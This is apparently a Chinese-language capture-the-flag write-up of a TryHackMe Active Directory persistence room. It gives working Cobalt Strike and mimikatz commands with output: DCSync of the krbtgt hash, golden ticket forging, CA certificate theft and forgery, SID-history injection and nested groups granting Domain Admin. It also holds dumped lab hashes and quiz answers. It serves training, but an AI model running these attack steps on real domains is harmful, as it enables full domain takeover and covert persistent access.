# 前置代理

这个房间我在本地无法直连vpn，需要加前置代理

## ssh
只能转发tcp

ssh动态绑定本地转发端口
```
ssh -N -D 127.0.0.1:9050 root@xxxx
```
在ovpn最前面加这两行
```
socks-proxy 127.0.0.1 9050
route t3.50redlight.com 255.255.255.255 net_gateway
```

# kali配置DNS

配置DNS文件
```
vim /etc/resolv.conf 
```

上面配置文件填入以下内容
```
nameserver 10.200.88.101
nameserver 114.114.114.114
```

重启网络
```
systemctl restart systemd-resolved
```

验证
```
┌──(root💀kali)-[~]
└─# nslookup thmdc.za.tryhackme.loc
Server:         10.200.83.101
Address:        10.200.83.101#53

Name:   thmdc.za.tryhackme.loc
Address: 10.200.83.101

```


# Task 2  Persistence through Credentials


在```http://distributor.za.tryhackme.loc/creds```生成的账号

```
Your credentials have been generated: Username: louis.cole Password: Password!
```


ssh登录，密码：```tryhackmewouldnotguess1@```
```
ssh Administrator@THMWRK1.za.tryhackme.loc 
```

获取krbtgt哈希
```
beacon> mimikatz lsadump::dcsync /domain:za.tryhackme.loc /user:za\krbtgt
[+] received output:
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] 'za\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 4/25/2022 7:18:22 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082
    ntlm- 0: 16f9af38fca3ada405386b3b57366082
    lm  - 0: 35c7b671efe40860dc078afd2786c902

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4bf7050f5f09f6d59a8699081d9ed432

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOCkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca
      aes128_hmac       (4096) : c893fd72ddf7fe2ee545f52b8368602f
      des_cbc_md5       (4096) : d904d37f8ab6fed6

* Primary:Kerberos *
    Default Salt : ZA.TRYHACKME.LOCkrbtgt
    Credentials
      des_cbc_md5       : d904d37f8ab6fed6

* Packages *
    NTLM-Strong-NTOWF
```

> What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?

> lsadump::dcsync /domain:za.tryhackme.loc /user:test

> What is the NTLM hash associated with the krbtgt user?

> 16f9af38fca3ada405386b3b57366082


# Task 3  Persistence through Tickets

枚举SID
```
beacon> powershell-import tools/PowerView.ps1
[*] Tasked beacon to import: /root/CobaltStrike/tools/PowerView.ps1
[+] host called home, sent: 143784 bytes
beacon> powershell Get-DomainSID
[*] Tasked beacon to run: Get-DomainSID
[+] host called home, sent: 305 bytes
[+] received output:
#< CLIXML
S-1-5-21-3885271727-2693558621-2658995185

```

申请金票
```
beacon> mimikatz kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
[*] Tasked beacon to run mimikatz's kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt command
[+] host called home, sent: 750706 bytes
[+] received output:
User      : ReallyNotALegitAccount
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt      
Lifetime  : 8/18/2022 10:24:04 AM ; 8/18/2022 8:24:04 PM ; 8/25/2022 10:24:04 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'ReallyNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session
```

> Which AD account's NTLM hash is used to sign Kerberos tickets?

> krbtgt

> What is the name of a ticket that impersonates a legitimate TGT?

> Golden Tickets

> What is the name of a ticket that impersonates a legitimate TGS?

> Silver Tickets

> What is the default lifetime (in years) of a golden ticket generated by Mimikatz?

> 10

# Task 4  Persistence through Certificates

枚举证书信息
```
beacon> mimikatz crypto::certificates /systemstore:local_machine
[*] Tasked beacon to run mimikatz's crypto::certificates /systemstore:local_machine command
[+] host called home, sent: 750710 bytes
[+] received output:
 * System Store  : 'local_machine' (0x00020000)
 * Store         : 'My'

 0. 
    Subject  : 
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 0800000000006f4c69a01c8fbbad0800000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 5/11/2022 2:29:07 PM -> 5/11/2023 2:29:07 PM
    Hash SHA1: de718d0c39b7b8564b1a4ad73acc1dcecf6fc692
	Key Container  : 8d822ca2f7b58a2dc5da34819224d0a4_cf5b8e23-6097-4b09-af93-e79b05557c3f
	Provider       : Microsoft RSA SChannel Cryptographic Provider
	Provider type  : RSA_SCHANNEL (12)
	Type           : AT_KEYEXCHANGE (0x00000001)
	|Provider name : Microsoft RSA SChannel Cryptographic Provider
	|Key Container : te-ComputerCertificateTemplate-6aec0025-30fd-4cf4-b476-d4a796f9af9e
	|Unique name   : 8d822ca2f7b58a2dc5da34819224d0a4_cf5b8e23-6097-4b09-af93-e79b05557c3f
	|Implementation: CRYPT_IMPL_SOFTWARE ; 
	Algorithm      : CALG_RSA_KEYX
	Key size       : 2048 (0x00000800)
	Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
	Exportable key : NO
```

使用mimikatz打补丁是的证书的秘钥可以被导出
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
"KeyIso" service patched
```

导出证书
```
mimikatz # crypto::certificates /systemstore:local_machine /export
```

生成我们自己的证书,使用[ForgeCert](https://github.com/GhostPack/ForgeCert)
```
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```

参数说明：

CaCertPath - 我们导出的 CA 证书的路径。
CaCertPassword - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码为mimikatz.
主题- 证书的主题或通用名称。这在我们将使用证书的上下文中并不重要。
SubjectAltName - 这是我们要使用此证书模拟的帐户的用户主体名称 (UPN)。它必须是合法用户。
NewCertPath - ForgeCert 将存储生成的证书的路径。
NewCertPassword - 由于证书需要导出用于身份验证的私钥，因此我们必须设置用于加密的新密码。


使用 Rubeus 请求使用证书的TGT

```
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.88.101
```

使用mimikatz ptt
```
kerberos::ptt administrator.kirbi
```

> What key is used to sign certificates to prove their authenticity?

> private key

> What application can we use to forge a certificate if we have the CA certificate and private key?

> ForgeCert.exe

> What is the Mimikatz command to pass a ticket from a file with the name of ticket.kirbi?

> kerberos::ptt ticket.kirbi


# Task 5  Persistence through SID History


枚举分配的低权限用户有没有 SID History
```
beacon> powershell Get-ADUser louis.cole -properties sidhistory,memberof
[*] Tasked beacon to run: Get-ADUser louis.cole -properties sidhistory,memberof
[+] host called home, sent: 413 bytes
[+] received output:
#< CLIXML


DistinguishedName : CN=louis.cole,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True
GivenName         : Louis
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : louis.cole
ObjectClass       : user
ObjectGUID        : bf78bdb9-3289-461d-8193-d7fd88d3b23b
SamAccountName    : louis.cole
SID               : S-1-5-21-3885271727-2693558621-2658995185-1120
SIDHistory        : {}
Surname           : Cole
UserPrincipalName : 

```

SIDHistory值为空


获取 Domain Admins 组的 SID，因为这是我们要添加到 SID 历史记录的组

```
beacon> powershell Get-ADGroup "Domain Admins"
[*] Tasked beacon to run: Get-ADGroup "Domain Admins"
[+] host called home, sent: 345 bytes
[+] received output:
#< CLIXML


DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Global
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512

```


停止ntds服务,把Domain Admins的sid添加到SIDHistory，重启ntds服务服务
```
Stop-Service -Name ntds -force

Add-ADDBSidHistory -SamAccountName 'louis.cole' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit

Start-Service -Name ntds 
```

再次查询确认SIDhistory已添加进去
```
PS C:\Users\aaron.jones> Get-ADUser aaron.jones -Properties sidhistory 

DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc 
Enabled : True 
GivenName : Aaron 
Name : aaron.jones 
ObjectClass : user 
ObjectGUID : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22 
SamAccountName : aaron.jones 
SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512} 
Surname : Jones 
UserPrincipalName : 
```

现在可以以普通域用户身份访问DC
```
PS C:\Users\aaron.jones> dir \\thmdc.za.tryhackme.loc\c$ 

Directory: \\thmdc.za.tryhackme.loc\c$ 

Mode LastWriteTime Length Name 
---- ------------- ------ ---- 
d----- 9/15/2018 8:19 AM PerfLogs 
d-r--- 5/11/2022 10:32 AM Program Files 
d----- 3/21/2020 8:28 PM Program Files (x86) 
d----- 4/25/2022 7:13 PM tmp 
da---- 5/11/2022 10:11 AM Tools 
d-r--- 4/27/2022 8:22 AM Users 
d----l 4/25/2022 7:11 PM vagrant 
d----- 4/27/2022 8:12 PM Windows 
-a---- 1/4/2022 7:47 AM 103 delete-vagrant-user.ps1 
-a---- 5/1/2022 9:11 AM 169 dns_entries.csv 
-a---- 5/1/2022 9:17 AM 1725 thm-network-setup-dc.ps1
```


> What AD object attribute is normally used to specify SIDs from the object's previous domain to allow seamless migration to a new domain?

> SIDHistory

> What is the database file on the domain controller that stores all AD information?

> ntds.dit

> What is the PowerShell command to restart the ntds service after we injected our SID history values?

> Start-Service -Name ntds 


# Task 6  Persistence through Group Membership

原理是通过嵌套组的关系，使得低权限用户最终继承DA的权限



创建组1
```
PS C:\Tools> New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "louis.cole Net Group 1" -SamAccountName "louis.cole_nestgroup1" -DisplayName "louis.cole Nest Group 1" -GroupScope Global -GroupCategory Security
```

创建组2，并且把组2作为组成员加到组1
```
PS C:\Tools> New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "louis.cole Net Group 2" -SamAccountName "louis.cole_nestgroup2" -DisplayName "louis.cole Nest Group 2" -GroupScope Global -GroupCategory Security                                                                                                    
PS C:\Tools> Add-ADGroupMember -Identity "louis.cole_nestgroup2" -Members "louis.cole_nestgroup1"
```

创建组3，并且把组3作为组成员加到组2
```
PS C:\Tools> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "louis.cole Net Group 3" -SamAccountName "louis.cole_nestgroup3" -DisplayName "louis.cole Nest Group 3" -GroupScope Global -GroupCategory Security                                                                                               
PS C:\Tools> Add-ADGroupMember -Identity "louis.cole_nestgroup3" -Members "louis.cole_nestgroup2"
```

把组3加到DA
```
Add-ADGroupMember -Identity "Domain Admins" -Members "louis.cole_nestgroup3"
```

最后，把低权限用户添加到组1中
```
Add-ADGroupMember -Identity "louis.cole_nestgroup1" -Members "louis.cole"
```

验证是否可以访问DC
```
PS C:\Tools> dir \\thmdc.za.tryhackme.loc\c$\


    Directory: \\thmdc.za.tryhackme.loc\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018   8:19 AM                PerfLogs
d-r---        5/11/2022  10:32 AM                Program Files
d-----        3/21/2020   8:28 PM                Program Files (x86)
d-----         7/6/2022   4:38 PM                tmp
da----        6/30/2022   2:58 PM                Tools
d-r---        4/27/2022   8:22 AM                Users
d----l        4/25/2022   7:11 PM                vagrant
d-----         7/3/2022   9:51 AM                Windows
-a----         1/4/2022   7:47 AM            103 delete-vagrant-user.ps1
-a----         5/1/2022   9:11 AM            169 dns_entries.csv
-a----         7/3/2022   6:05 PM           7168 shell.exe
-a----         5/1/2022   9:17 AM           1725 thm-network-setup-dc.ps1

```

> What is the term used to describe AD groups that are members of other AD groups?

> group nesting

> What is the command to add a new member, thmtest, to the AD group, thmgroup?

> Add-ADGroupMember -Identity "thmgroup" -Members "thmtest"

# Task 7  Persistence through ACLs

> What AD group's ACLs are used as a template for the ACLs of all Protected Groups?

> AdminSDHolder 

> What AD service updates the ACLs of all Protected Groups to match that of the template?

> SDProp

> What ACL permission allows the user to perform any action on the AD object?

> full control


# Task 8  Persistence through GPOs

> What MMC snap-in can be used to manage GPOs?

> Group Policy Management

> What sub-GPO is used to grant users and groups access to local groups on the hosts that the GPO applies to?

> Restricted groups

> What tab is used to modify the security permissions that users and groups have on the GPO?

> Delegation 

